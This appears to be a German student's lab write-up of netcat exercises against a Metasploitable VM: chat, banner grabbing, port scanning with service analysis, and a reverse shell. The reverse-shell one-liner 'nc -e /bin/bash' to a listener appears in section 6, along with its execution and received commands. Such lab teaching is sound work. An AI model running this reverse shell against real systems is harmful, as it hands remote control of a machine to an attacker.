## 1. Übung (netcat chat)

**IP Metasploitable: 192.168.8.51**  
**IP Kali (eigener Rechner): 192.168.8.52**

### 1.1 Rechner A – Listener starten

```bash
$ nc -lvp 4444
Listening on [any] 4444
```

### 1.2 Rechner B – Verbindung aufbauen

```bash
$ nc 192.168.8.52 4444
```

Ab diesem Punkt können beide Seiten Nachrichten eingeben und mit Enter senden. Beendet wird die Verbindung mit `Ctrl+C`.

## 3. Übung (netcat banner grabbing)

### 3.1 Verbindung zu Metasploitable

```bash
┌──(kali㉿kali)-[~]
└─$ nc 192.168.8.51 80              
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Mon, 26 Jan 2026 14:10:49 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Connection: close
Content-Type: text/html
```

### 3.2 Analyse der Serverantwort

| Feld | Wert |
|------|------|
| HTTP Status | `200 OK` |
| Server | `Apache/2.2.8 (Ubuntu) DAV/2` |
| PHP Version | `PHP/5.2.4-2ubuntu5.10` |
| Datum | Mon, 26 Jan 2026 14:10:49 GMT |

Die `Server:`-Zeile verrät die eingesetzte Software inkl. Version. Mit diesen Informationen können gezielt bekannte Exploits gesucht werden.

| Information | Bedeutung / Risiko |
|-------------|-------------------|
| `Apache/2.2.8` | Sehr alte Version (2008) mit bekannten Sicherheitslücken |
| `Ubuntu` | Betriebssystem des Servers |
| `DAV/2` | WebDAV aktiviert – Dateioperationen über HTTP möglich |
| `PHP/5.2.4` | Veraltete PHP-Version mit kritischen Schwachstellen |

### 3.3 Externe Verbindungen (example.com, htl-braunau.at)

Verbindungsversuche zu externen Webseiten wurden durch die Schul-Firewall (FortiGuard) blockiert:

```bash
$ nc example.com 80
HEAD / HTTP/1.0

HTTP/1.1 403 Forbidden
...
FortiGuard Intrusion Prevention - Access Blocked
Category: Unrated
URL: http://104.20.23.154/
```

Statt eines Server-Banners lieferte die Firewall ihre eigene Blockseite zurück.

## 4. Übung (netcat banner grabbing II)

**Ziel:** Die HTTP-Anfrage nicht manuell eintippen, sondern per `|` (Pipe) an `nc` übergeben.

### 4.1 Kommando

```bash
$ printf "HEAD / HTTP/1.0\r\n\r\n" | nc -w 3 192.168.8.51 80
HTTP/1.1 200 OK
Date: Mon, 26 Jan 2026 14:35:55 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Connection: close
Content-Type: text/html
```

### 4.2 Erklärung

| Element | Bedeutung |
|---------|-----------|
| `printf` | Gibt Text aus und interpretiert `\r\n` als Steuerzeichen |
| `\r\n` | CR+LF – laut HTTP-Protokoll (RFC 2616) zwingend erforderlich |
| `\r\n\r\n` | Zwei Leerzeilen = Ende des HTTP-Request-Headers |
| `\|` | Pipe: Ausgabe von `printf` wird als Eingabe an `nc` weitergeleitet |
| `-w 3` | Timeout: 3 Sekunden – `nc` beendet sich automatisch |

### 4.3 Warum `printf` statt `echo`?

`echo` interpretiert `\r\n` nicht als Steuerzeichen – es sendet die Zeichen `\`, `r`, `\`, `n` als Text. `printf` hingegen wandelt `\r` (CR, 0x0D) und `\n` (LF, 0x0A) korrekt in die entsprechenden Bytes um, wie es das HTTP-Protokoll erfordert.

```bash
# funktioniert NICHT korrekt:
echo "HEAD / HTTP/1.0\r\n\r\n" | nc 192.168.8.51 80

# funktioniert korrekt:
printf "HEAD / HTTP/1.0\r\n\r\n" | nc -w 3 192.168.8.51 80
```

## 5. Übung (netcat port scanning)

**Ziel:** Mit netcat feststellen welche Ports auf Metasploitable (192.168.8.51) offen sind.

### 5.1 Port Scan (Port 1–1000)

```bash
$ nc -zv -w 1 192.168.8.51 1-1000
192.168.8.51: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.8.51] 514 (shell) open
(UNKNOWN) [192.168.8.51] 513 (login) open
(UNKNOWN) [192.168.8.51] 512 (exec) open
(UNKNOWN) [192.168.8.51] 445 (microsoft-ds) open
(UNKNOWN) [192.168.8.51] 139 (netbios-ssn) open
(UNKNOWN) [192.168.8.51] 111 (sunrpc) open
(UNKNOWN) [192.168.8.51] 80 (http) open
(UNKNOWN) [192.168.8.51] 53 (domain) open
(UNKNOWN) [192.168.8.51] 25 (smtp) open
(UNKNOWN) [192.168.8.51] 23 (telnet) open
(UNKNOWN) [192.168.8.51] 22 (ssh) open
(UNKNOWN) [192.168.8.51] 21 (ftp) open
```

### 5.2 Erklärung der Flags

| Flag | Bedeutung |
|------|-----------|
| `-z` | Scan-Modus: keine Daten senden, nur Verbindung testen |
| `-v` | Verbose: offene Ports werden angezeigt |
| `-w 1` | Timeout: 1 Sekunde pro Port |
| `1-1000` | Portbereich: Port 1 bis 1000 |

### 5.3 Gefundene Dienste

| Port | Dienst | Beschreibung |
|------|--------|-------------|
| 21 | FTP | Dateiübertragung – vsFTPd 2.3.4 mit bekannter Backdoor (CVE-2011-2523) |
| 22 | SSH | Remote-Login – OpenSSH 4.7p1, veraltete Version |
| 23 | Telnet | Unverschlüsselter Fernzugriff |
| 25 | SMTP | Mailserver ohne Verschlüsselung |
| 53 | DNS | Domain Name System |
| 80 | HTTP | Webserver – Apache 2.2.8 |
| 111 | SunRPC | Remote Procedure Call – häufig angreifbar |
| 139 | NetBIOS | Windows-Netzwerkdienst |
| 445 | SMB | Dateifreigabe – bekannte Schwachstellen (z.B. EternalBlue) |
| 512 | exec | Remote Execution – unverschlüsselt |
| 513 | login | Remote Login – unverschlüsselt |
| 514 | shell | Remote Shell – unverschlüsselt |

### 5.4 Banner Grabbing auf offenen Ports

#### SSH (Port 22)

```bash
$ nc 192.168.8.51 22
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
Protocol mismatch.
```

→ OpenSSH 4.7p1 – sehr alte Version mit bekannten Schwachstellen.

#### FTP (Port 21)

```bash
$ nc 192.168.8.51 21
220 (vsFTPd 2.3.4)
```

→ vsFTPd 2.3.4 – enthält eine berüchtigte Backdoor (CVE-2011-2523). Ein Angreifer kann durch einen speziellen Login-Versuch eine Root-Shell öffnen.

#### Telnet (Port 23)

```bash
$ nc 192.168.8.51 23
��▒�� ��#��'
```

→ Kein lesbarer Banner. Telnet sendet zuerst binäre **IAC-Negotiation-Bytes** zur Terminal-Aushandlung, die `nc` nicht interpretieren kann. Ein echter Telnet-Client würde diese Bytes verarbeiten und einen lesbaren Prompt anzeigen.

## 6. Übung (netcat reverse shell)

### 6.1 Analyse der Kommandozeile

```bash
nc -e /bin/bash 10.20.30.40 4242
```

| Element | Bedeutung |
|---------|-----------|
| `nc` | netcat |
| `-e /bin/bash` | Führe `/bin/bash` aus und verbinde Ein-/Ausgabe mit dem Socket |
| `10.20.30.40` | IP-Adresse des Angreifers (Listener) |
| `4242` | Port auf dem der Listener wartet |

### 6.2 Durchführung

**Schritt 1 – Listener starten (Angreifer / eigener Rechner):**

```bash
$ nc -lvp 4242
listening on [any] 4242 ...
```

**Schritt 2 – Reverse Shell ausführen (Mitschüler):**

```bash
nc -e /bin/bash 192.168.8.52 4242
```

**Schritt 3 – Verbindung erhalten und Befehle ausführen:**

```bash
$ nc -lvp 4242
listening on [any] 4242 ...
192.168.8.52: inverse host lookup failed: Unknown host
connect to [192.168.7.52] from (UNKNOWN) [192.168.8.52] 49558
hostname
kali
whoami
kali
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.8.52/24 brd 192.168.8.255 scope global dynamic noprefixroute eth0
```

### 6.3 Warum nennt man das eine Reverse Shell?

Bei einer normalen Shell verbindet sich der **Angreifer zum Opfer** (→ Bind Shell). Bei der Reverse Shell dreht sich die Verbindungsrichtung um: Das **Opfer verbindet sich aktiv zum Angreifer**. Der Angreifer wartet nur passiv mit einem Listener.

```
Normale Shell:   Angreifer ──────► Opfer
Reverse Shell:   Angreifer ◄────── Opfer
```

### 6.4 Vorteil und Anwendungsfall

**Vorteil:** Firewalls blockieren meist **eingehende** Verbindungen, lassen aber **ausgehende** durch. Da das Opfer-System die Verbindung initiiert, wird die Firewall-Regel umgangen.

**Wer verwendet es?**
- **Angreifer** – um Zugriff auf Systeme hinter Firewalls zu erhalten
- **Penetrationstester** – um Sicherheitslücken in Firewalls zu demonstrieren
